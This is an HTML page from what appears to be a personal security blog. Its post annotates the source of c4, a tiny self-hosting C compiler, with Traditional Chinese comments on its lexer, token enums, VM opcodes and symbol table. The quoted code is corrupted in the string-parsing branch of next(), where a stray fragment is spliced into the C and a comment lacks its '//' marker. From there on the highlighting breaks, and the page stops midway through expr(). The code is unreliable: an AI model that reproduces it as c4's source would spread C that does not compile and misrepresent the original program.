<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Documenting the journey of cyber security">
<meta property="og:type" content="website">
<meta property="og:title" content="HackThe4O4">
<meta property="og:url" content="https://no-flag.com/page/5/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Documenting the journey of cyber security">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-c4" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/c4/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.077Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/c4/">
        C4 - C In Four Functions
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="4個函數，528行代碼實現可自舉的C語言編譯器"><a href="#4個函數，528行代碼實現可自舉的C語言編譯器" class="headerlink" title="4個函數，528行代碼實現可自舉的C語言編譯器"></a><strong>4個函數，528行代碼實現可自舉的C語言編譯器</strong></h1><p>C4怎麼工作？</p>
<p>模擬程式運作機制定義了簡單的vm（虛擬機器）的暫存器，程式運行的資料和程式碼段等<br>透過解析輸入檔的字元流，生產資料段和程式碼段的內容<br>透過讀取程式碼段的內容，模擬執行，輸出結果。<br>特別說明</p>
<p>這裡的模擬執行其實就是特定的符號映射成一般的c語言的程式設計過程：</p>
<p>如模擬執行的程式碼ADD，就是程式設計時的+</p>
<p>如模擬執行的PRTF，就是呼叫一般的printf</p>
<p>一句話說就是解析原始碼檔案字元流為內部的特定標識符，然後讀取標識符，執行對應的操作，完成原始程式碼的功能。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rswier/c4/tree/master">https://github.com/rswier/c4/tree/master</a></p>
<p><img src="/img/c4.png" alt="Untitled"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *p, *lp, <span class="comment">// 原始碼中目前正在處理的位置</span></span><br><span class="line">     *data;   <span class="comment">// 程式碼段</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *e, *le,  <span class="comment">// 程式碼段</span></span><br><span class="line">    *id,      <span class="comment">// 目前正在詞法分析的標識符</span></span><br><span class="line">    *sym,     <span class="comment">// 符號表</span></span><br><span class="line">    tk,       <span class="comment">// 目前的符號</span></span><br><span class="line">    ival,    <span class="comment">// 符號對應的值</span></span><br><span class="line">    ty,       <span class="comment">// 目前表達式的類型</span></span><br><span class="line">    loc,     <span class="comment">// 局部變數在堆疊中的偏移</span></span><br><span class="line">    line,    <span class="comment">// 目前行數</span></span><br><span class="line">    src,     <span class="comment">// 輸出源碼和彙編</span></span><br><span class="line">    debug;   <span class="comment">// 列印執行的指令</span></span><br><span class="line"><span class="comment">// tokens and classes (operators last and in precedence order)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">為何 enum 是從 128 開始的呢？ </span></span><br><span class="line"><span class="comment">主要是因為 ASCII Code 定義的範圍是 0~127 共 128 字元，所以自訂的 token number 必須從 128 開始編號</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// Id = identifier 使用者定義的identifier</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*運算符</span></span><br><span class="line"><span class="comment">Assign =</span></span><br><span class="line"><span class="comment">Cond ?</span></span><br><span class="line"><span class="comment">Lor ||</span></span><br><span class="line"><span class="comment">Lan &amp;&amp;</span></span><br><span class="line"><span class="comment">Or |</span></span><br><span class="line"><span class="comment">Xor ^</span></span><br><span class="line"><span class="comment">And &amp;</span></span><br><span class="line"><span class="comment">Eq ==</span></span><br><span class="line"><span class="comment">Ne !=</span></span><br><span class="line"><span class="comment">Lt &lt;</span></span><br><span class="line"><span class="comment">Gt &gt;</span></span><br><span class="line"><span class="comment">Le &lt;=</span></span><br><span class="line"><span class="comment">Ge &gt;=</span></span><br><span class="line"><span class="comment">Shl &lt;&lt;</span></span><br><span class="line"><span class="comment">Shr &gt;&gt;</span></span><br><span class="line"><span class="comment">Add +</span></span><br><span class="line"><span class="comment">Sub -</span></span><br><span class="line"><span class="comment">Mul *</span></span><br><span class="line"><span class="comment">Div /</span></span><br><span class="line"><span class="comment">Mod %</span></span><br><span class="line"><span class="comment">Inc ++</span></span><br><span class="line"><span class="comment">Dec --</span></span><br><span class="line"><span class="comment">Brak [</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">id[Class] =</span></span><br><span class="line"><span class="comment">Num 常數數值</span></span><br><span class="line"><span class="comment">Fun 函數</span></span><br><span class="line"><span class="comment">Sys 系統調用</span></span><br><span class="line"><span class="comment">Glo 全域變數</span></span><br><span class="line"><span class="comment">Loc 局部變數</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//支援的標記類別(給詞法分析器next解析成對應的標記)</span></span><br><span class="line"><span class="comment">// C4所支援的輸入原始碼的字元集限定在7-bit ASCII上，所以每個輸入的字元只可能在[0, 127]的閉區間範圍內，所以是128</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  Num = <span class="number">128</span>, Fun, Sys, Glo, Loc, Id,</span><br><span class="line">  Char, Else, Enum, If, Int, Return, Sizeof, While,</span><br><span class="line">  Assign, Cond, Lor, Lan, Or, Xor, And, Eq, Ne, Lt, Gt, Le, Ge, Shl, Shr, Add, Sub, Mul, Div, Mod, Inc, Dec, Brak</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// opcodes</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">通常，LDR 用於將某些內容從記憶體載入到暫存器中，而 STR 用於將某些內容從暫存器儲存到記憶體位址。</span></span><br><span class="line"><span class="comment">sp：stack frame。</span></span><br><span class="line"><span class="comment">a：register 暫存器。</span></span><br><span class="line"><span class="comment">bp：概念跟 rbp(32 bits)/ebp(64 bits) 相同。</span></span><br><span class="line"><span class="comment">pc：program counter，指向當前指令。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 虛擬機器指令</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,</span><br><span class="line">       OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,</span><br><span class="line">       OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支援的資料型別</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> CHAR, INT, PTR &#125;;</span><br><span class="line"><span class="comment">//因為作者沒有實作結構體,所以[id]指向的空間被分割為Idsz大小的區塊(模擬結構體)</span></span><br><span class="line"><span class="comment">//當id指向區塊首時,id[0] == id[Tk] 存取的就是Tk成員的資料(一般是指標)</span></span><br><span class="line"><span class="comment">//其實這種做法，在高階語言裡可以理解為：沒有物件的多元素數組，來模擬對象</span></span><br><span class="line"><span class="comment">//以下是符號表的各項：</span></span><br><span class="line"><span class="comment">//Name 指向的是這個identifier的Name</span></span><br><span class="line"><span class="comment">//Type 為資料型別(例如傳回值型別),如CHAR,INT,INT+PTR</span></span><br><span class="line"><span class="comment">//Class 為型別,如Num(常數數值),Fun(函數),Sys(系統呼叫),Glo全域變數,Loc 局部變數</span></span><br><span class="line"><span class="comment">//符號表是一個長數組，每個數組的元素為符號描述，元素長度為Idsz</span></span><br><span class="line"><span class="comment">// identifier offsets (since we can&#x27;t create an ident struct)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">由於 c4 不支援 struct，因此使用 enum 來定義 symbol table(called id for c4)。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> Tk, Hash, Name, Class, Type, Val, HClass, HType, HVal, Idsz &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//詞法分析開始：</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">next</span><span class="params">()</span></span><br><span class="line">&#123;<span class="comment">// 標識符=輸入的符號</span></span><br><span class="line">  <span class="type">char</span> *pp;<span class="comment">// 標識符的起始位置</span></span><br><span class="line"><span class="comment">//next() function 是根據 p 所指的 String 做 parsing token 的動作。</span></span><br><span class="line"><span class="comment">// 用循環來忽略空白字元,不過不能被詞法分析器辨識的字元都被認為是空白字元 例如 &#x27;@&#x27;, &#x27;$&#x27;</span></span><br><span class="line">  <span class="keyword">while</span> (tk = *p) &#123;<span class="comment">//最外層的 while 大部分情況都不會是終止條件，主要是由 while 內部直接 return，因此 next() 的邏輯是處理完一個 token 後就會直接 return。</span></span><br><span class="line">    ++p;</span><br><span class="line"><span class="comment">// 1、列印輸出訊息</span></span><br><span class="line">    <span class="keyword">if</span> (tk == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (src) &#123;<span class="comment">//命令列指明-s參數,輸出原始碼與對應字節碼</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: %.*s&quot;</span>, line, p - lp, lp);</span><br><span class="line">        lp = p;</span><br><span class="line">        <span class="keyword">while</span> (le &lt; e) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%8.4s&quot;</span>, &amp;<span class="string">&quot;LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,&quot;</span></span><br><span class="line">                           <span class="string">&quot;OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,&quot;</span></span><br><span class="line">                           <span class="string">&quot;OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT,&quot;</span>[*++le * <span class="number">5</span>]);</span><br><span class="line">          <span class="keyword">if</span> (*le &lt;= ADJ) <span class="built_in">printf</span>(<span class="string">&quot; %d\n&quot;</span>, *++le); <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);<span class="comment">//ADJ之前的指令都有運算元</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ++line;<span class="comment">// 行數+1</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 2、遇到巨集處理操作</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;#&#x27;</span>) &#123;<span class="comment">//#由於不支援巨集處理,所以直接跳過</span></span><br><span class="line">      <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != <span class="string">&#x27;\n&#x27;</span>) ++p;<span class="comment">// 忽略目前行的操作</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">這段是主要處理 Keywords。</span></span><br><span class="line"><span class="comment">第一步先算出該 token 的 hash value，然後利用 hash value and name 找尋 symbol table，</span></span><br><span class="line"><span class="comment">如果有找到就回傳該 token enum value；如果找不到就新增 id(symbol)，</span></span><br><span class="line"><span class="comment">並且設定 token enum value 為 Id(133)。</span></span><br><span class="line"><span class="comment">這邊最容易混淆的是 tk 這個 variable：在進入此 code block 之前，tk=*p；</span></span><br><span class="line"><span class="comment">然後在算 hash value 的時候，tk 代表的是 hash value；</span></span><br><span class="line"><span class="comment">最後要 return 前，tk 紀錄的是 token enum value。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 3.解析合法的變數名</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((tk &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;z&#x27;</span>) || (tk &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;Z&#x27;</span>) || tk == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">      pp = p - <span class="number">1</span>;<span class="comment">//因為有++p,pp回退一個字元,pp指向 [這個符號] 的首字母</span></span><br><span class="line">      <span class="keyword">while</span> ((*p &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;z&#x27;</span>) || (*p &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;Z&#x27;</span>) || (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;9&#x27;</span>) || *p == <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">        tk = tk * <span class="number">147</span> + *p++;<span class="comment">//計算標識符雜湊值,tk起始時已經等於*p,從p開始解析</span></span><br><span class="line">      tk = (tk &lt;&lt; <span class="number">6</span>) + (p - pp);<span class="comment">//雜湊值加上[符號長度]</span></span><br><span class="line">      id = sym;<span class="comment">//將id指向符號表</span></span><br><span class="line">      <span class="keyword">while</span> (id[Tk]) &#123;</span><br><span class="line"><span class="comment">//根據hash值還有字元來判斷該標識符是否已經儲存了</span></span><br><span class="line">        <span class="keyword">if</span> (tk == id[Hash] &amp;&amp; !<span class="built_in">memcmp</span>((<span class="type">char</span> *)id[Name], pp, p - pp)) </span><br><span class="line">				&#123; </span><br><span class="line"><span class="comment">//找到同名,則tk = id[Tk] (將id看做結構體,訪問其Tk成員,解釋見上)</span></span><br><span class="line">					tk = id[Tk];</span><br><span class="line">					<span class="keyword">return</span>; <span class="comment">//代表該識別碼已經被識別</span></span><br><span class="line">				&#125;</span><br><span class="line">        id = id + Idsz;<span class="comment">//繼續循環identifier表</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//找不到，將新的識別碼儲存到符號表中</span></span><br><span class="line">      id[Name] = (<span class="type">int</span>)pp;</span><br><span class="line">      id[Hash] = tk;<span class="comment">//哈希值</span></span><br><span class="line">      tk = id[Tk] = Id;<span class="comment">//哈希值</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//這三個條件分別處理的是十進位、十六進位、八進位。回傳計算後的 ival and tk=Num。</span></span><br><span class="line"><span class="comment">// 4、解析八進制、十進制、十六進制數字</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;<span class="comment">// 第一位為數字,認為是數值</span></span><br><span class="line">      <span class="keyword">if</span> (ival = tk - <span class="string">&#x27;0&#x27;</span>) &#123; <span class="keyword">while</span> (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;9&#x27;</span>) ival = ival * <span class="number">10</span> + *p++ - <span class="string">&#x27;0&#x27;</span>; &#125;<span class="comment">//第一位不為0,認為是十進制數</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (*p == <span class="string">&#x27;x&#x27;</span> || *p == <span class="string">&#x27;X&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> ((tk = *++p) &amp;&amp; ((tk &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;9&#x27;</span>) || (tk &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;f&#x27;</span>) || (tk &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; tk &lt;= <span class="string">&#x27;F&#x27;</span>)))<span class="comment">//第一位為0,且以x開頭,認為是16進制數</span></span><br><span class="line">          <span class="comment">//這邊處理 16 進位的方式相當有趣，主要是如何把 A~F 轉成 10~15，為何只需要 +9 就可以將 16 進位英文的部份轉成數字？關鍵在於 ‘A’ 的 ASCII code = 65 = ‘0100 0001’，而數字 10 的 2 進位是 ‘1010’，由於 16 進位並不會使用的 MSB 的 4 bits，因此 (tk &amp; 15) 濾掉前面 4 bits。觀察從 A 轉成數字 10 LSB 的差距：‘1010’ - ‘0001’ = ‘1001’ = 9。</span></span><br><span class="line">					ival = ival * <span class="number">16</span> + (tk &amp; <span class="number">15</span>) + (tk &gt;= <span class="string">&#x27;A&#x27;</span> ? <span class="number">9</span> : <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="keyword">while</span> (*p &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; *p &lt;= <span class="string">&#x27;7&#x27;</span>) ival = ival * <span class="number">8</span> + *p++ - <span class="string">&#x27;0&#x27;</span>; &#125;<span class="comment">//認為是八進位數</span></span><br><span class="line">      tk = Num;<span class="comment">//token 為數值型,傳回</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 5、解析註釋，只支援單行註釋</span></span><br><span class="line"><span class="comment">//這段是處理 Div(/) or comment(//)，回傳tk=Div。</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (*p == <span class="string">&#x27;/&#x27;</span>) &#123;<span class="comment">//兩個&#x27;/&#x27;開頭,單行註釋</span></span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != <span class="string">&#x27;\n&#x27;</span>) ++p;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        tk = Div;<span class="comment">//除法</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//這段主要是處理 String，並且將字串存入 data section 中。回傳 data 起始位置 ival = (int)pp;，如果 tk=` 將 token 設為 Num，tk=Num。</span></span><br><span class="line"><span class="comment">//值得一提的是，‘\n’ 需要特別處理，因為在字串處理中，‘\n’ 會被當成兩個字元，但其實在 ASCII 中他是 LF(換行字元)，ASCII code = 10。</span></span><br><span class="line"><span class="comment">// 6、解析字串</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tk == <span class="string">&#x27;\&#x27;&#x27;</span> || tk == <span class="string">&#x27;&quot;&#x27;</span>) &#123;<span class="comment">//引號開頭,認為是字元(字串)</span></span><br><span class="line">      pp = data;</span><br><span class="line">      <span class="keyword">while</span> (*p != <span class="number">0</span> &amp;&amp; *p != tk) &#123;<span class="comment">//直到找到符合的引號為止</span></span><br><span class="line">        <span class="keyword">if</span> ((ival = *p++) == <span class="string">&#x27;\\&#x27;</span>) &#123;<span class="comment">// 解析轉義字符</span></span><br><span class="line">          <span class="keyword">if</span> ((ival = *p++) == <span class="string">&#x27;n&#x27;</span>) ival = <span class="string">&#x27;\n&#x27;</span>;\n<span class="string">&#x27;;// &#x27;</span>\n<span class="string">&#x27; 認為是&#x27;</span>\n<span class="string">&#x27; 其他直接忽略&#x27;</span>\<span class="string">&#x27;轉義</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if (tk == &#x27;</span><span class="string">&quot;&#x27;) *data++ = ival;//如果是雙引號,認為是字串,向data拷貝字符</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      ++p;</span></span><br><span class="line"><span class="string">      if (tk == &#x27;&quot;</span><span class="string">&#x27;) ival = (int)pp; else tk = Num;雙引號則ival指向data中字串開始,單引號則認為是數字</span></span><br><span class="line"><span class="string">      return;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">//Operator 的部分會轉成 token enum value，其他符號的部分就直接依照 ASCII Code 回傳，這就是為何 token enum value 要從 128 開始，因為不能和 ASCII Code 產生衝突！</span></span><br><span class="line"><span class="string">// 7、解析運算符號，和指令一一對應</span></span><br><span class="line"><span class="string">//經過 next() 後就完成 token parser，並且取得 token enum value(tk)(andival if need)。</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>=<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Eq; &#125; else tk = Assign; return; &#125;//等於,賦值</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>+<span class="string">&#x27;) &#123; if (*p == &#x27;</span>+<span class="string">&#x27;) &#123; ++p; tk = Inc; &#125; else tk = Add; return; &#125;//加,賦值</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>-<span class="string">&#x27;) &#123; if (*p == &#x27;</span>-<span class="string">&#x27;) &#123; ++p; tk = Dec; &#125; else tk = Sub; return; &#125;//減,自增</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>!<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Ne; &#125; return; &#125;//不等於</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&lt;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Le; &#125; else if (*p == &#x27;</span>&lt;<span class="string">&#x27;) &#123; ++p; tk = Shl; &#125; else tk = Lt; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&gt;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>=<span class="string">&#x27;) &#123; ++p; tk = Ge; &#125; else if (*p == &#x27;</span>&gt;<span class="string">&#x27;) &#123; ++p; tk = Shr; &#125; else tk = Gt; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>|<span class="string">&#x27;) &#123; if (*p == &#x27;</span>|<span class="string">&#x27;) &#123; ++p; tk = Lor; &#125; else tk = Or; return; &#125;//邏輯或 || OR</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>&amp;<span class="string">&#x27;) &#123; if (*p == &#x27;</span>&amp;<span class="string">&#x27;) &#123; ++p; tk = Lan; &#125; else tk = And; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>^<span class="string">&#x27;) &#123; tk = Xor; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>%<span class="string">&#x27;) &#123; tk = Mod; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>*<span class="string">&#x27;) &#123; tk = Mul; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>[<span class="string">&#x27;) &#123; tk = Brak; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>?<span class="string">&#x27;) &#123; tk = Cond; return; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == &#x27;</span>~<span class="string">&#x27; || tk == &#x27;</span>;<span class="string">&#x27; || tk == &#x27;</span>&#123;<span class="string">&#x27; || tk == &#x27;</span>&#125;<span class="string">&#x27; || tk == &#x27;</span>(<span class="string">&#x27; || tk == &#x27;</span>)<span class="string">&#x27; || tk == &#x27;</span>]<span class="string">&#x27; || tk == &#x27;</span>,<span class="string">&#x27; || tk == &#x27;</span>:<span class="string">&#x27;) </span></span><br><span class="line"><span class="string">return;;//不做處理</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//表達式分析</span></span><br><span class="line"><span class="string">//lev表示運算子,因為各個&#x27;</span>運算子token是依照優先權<span class="string">&#x27;生序排列的,所以lev大表示優先權高</span></span><br><span class="line"><span class="string">//不做處理</span></span><br><span class="line"><span class="string">void expr(int lev)</span></span><br><span class="line"><span class="string">&#123;  int t, *d;</span></span><br><span class="line"><span class="string">//第一部分利用 recursive descent (parsing)，檢查 symbol table (semantic Analyzer)，直接產生 IR (Code Generator)；如果有需要就會進行第二部分，Operator precedence (parsing)，主要處理四則運算。</span></span><br><span class="line"><span class="string">  if (!tk) &#123; printf(&quot;%d: unexpected eof in expression\n&quot;, line); exit(-1); &#125;// 1、遇到非法輸入直接退出，報錯</span></span><br><span class="line"><span class="string">//Num 數字處理</span></span><br><span class="line"><span class="string">// 2、解析數字表達式</span></span><br><span class="line"><span class="string">  else if (tk == Num) &#123; *++e = IMM; *++e = ival; next(); ty = INT; &#125;//直接取立即數作為表達式值，用IMM 指令將它載入到AX 中</span></span><br><span class="line"><span class="string">//將字串存入 data section 中。回傳 data 起始位置 ival = (int)pp;</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;</span><span class="string">&quot;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = ival; next();</span></span><br><span class="line"><span class="string">    while (tk == &#x27;&quot;</span><span class="string">&#x27;) next();//連續的&#x27;</span><span class="string">&quot;&#x27; 處理C風格多行文字 例如[&quot;</span>abc<span class="string">&quot; &quot;</span>def<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    data = (char *)((int)data + sizeof(int) &amp; -sizeof(int)); ty = PTR;//這邊的 data 有特別做 alignment [https://en.wikipedia.org/wiki/Data_structure_alignment]，最後輸出 IR。</span></span><br><span class="line"><span class="string">//位元組對齊到int，在末尾追加結束符 ty = PTR;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 4、解析回傳類型表達式</span></span><br><span class="line"><span class="string">  else if (tk == Sizeof) &#123;//Sizeof Operator直接計算 sizeof 的大小。</span></span><br><span class="line"><span class="string">    next(); if (tk == &#x27;(&#x27;) next(); else &#123; printf(&quot;</span>%d: open paren expected in <span class="keyword">sizeof</span>\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    ty = INT; if (tk == Int) next(); else if (tk == Char) &#123; next(); ty = CHAR; &#125;</span></span><br><span class="line"><span class="string">    while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//多層指標,每多一級加PTR</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected in <span class="keyword">sizeof</span>\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = (ty == CHAR) ? sizeof(char) : sizeof(int);//除了char是一位元組,int和多層指標</span></span><br><span class="line"><span class="string">    ty = INT;// 結果都為int型</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 5、解析變數取值與函數呼叫</span></span><br><span class="line"><span class="string">  else if (tk == Id) &#123;//變數處理</span></span><br><span class="line"><span class="string">    d = id; next();//第一個 if 處理 function call，第二個 else if 處理 enum，第三個 else 處理變數。</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) &#123;//lookahead 的技巧。//函數</span></span><br><span class="line"><span 